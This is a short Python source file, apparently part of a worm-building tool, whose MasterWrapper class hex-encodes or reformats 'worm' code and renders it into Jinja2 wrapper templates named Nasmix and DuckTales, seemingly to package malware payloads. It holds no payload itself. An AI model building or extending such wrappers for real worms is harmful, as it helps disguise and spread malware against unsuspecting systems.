import base64
from jinja2 import Template

from typing import Union

class MasterWrapper:
    def __init__(self, coder: object):
        self.coder = coder
        self.msg = self.coder.msg
    

    def nasm_wrapper(self, wrapper_code: str, worm_code: str, var: dict = {}) -> str:
        self.msg("msg", "Use 'nasm wrapper'")
        raw = Template(wrapper_code)
        wcode = worm_code.replace('"', "'")
        scode = ""
        for line in wcode.split("\n"):
            if line == "":
                continue
            scode += f'"{line}",10,'
        scode += "0"
        data = {"WORM_FINAL_CODE" : scode}
        raw = raw.render(data)
        return raw
    
    
    def nasmix_wrapper(self, worm_pipeline: object, wrapper: object) -> object:
        wrap = Template(wrapper.raw_code)
        code = worm_pipeline.code.encode("utf-8").hex()
        worm_pipeline.var["WORM_FINAL_CODE"] = code
        wrap = wrap.render(worm_pipeline.var)
        worm_pipeline.code = wrap
        return worm_pipeline
    
    def duck_tales(self, worm_pipeline: object, wrapper: object) -> object:
        wrap = Template(wrapper.raw_code)
        code = worm_pipeline.code.encode().hex()
        worm_pipeline.var["WORM_FINAL_CODE"] = code
        worm_pipeline.var["CODE_LEN"] = len(code) + 23
        wrap = wrap.render(worm_pipeline.var)
        worm_pipeline.code = wrap
        return worm_pipeline
    

    
    def wrap_worm(self, worm_pipeline: object, wrapper: object) -> object:
        match wrapper.name:
            case "Nasmix":
                worm_pipeline = self.nasmix_wrapper(worm_pipeline, wrapper)
            case "DuckTales":
                worm_pipeline = self.duck_tales(worm_pipeline, wrapper)
            case _:
                self.msg("error", f"ERROR: wrapper: '{wrapper.name}' does not exists")

        return worm_pipeline
